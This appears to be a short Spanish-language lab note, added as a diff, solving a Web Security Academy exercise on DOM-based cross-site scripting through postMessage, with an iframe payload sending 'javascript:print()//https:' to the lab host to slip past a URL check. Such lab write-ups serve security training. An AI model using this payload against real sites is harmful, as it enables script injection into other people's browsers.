@@ -1,0 +1,5 @@
+bueno aca es el mismo que lo de message de fijarse ahora que el addEventListener() requiere que sea https:// o http:// asi que simplemente hacemos lo mismo que antes pero agregamos un http://
+
+<iframe src="https://0a3500a60478fa88819b253700d600b2.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
+
+reemplaza lo de 0a...00b2 por el id tuyo
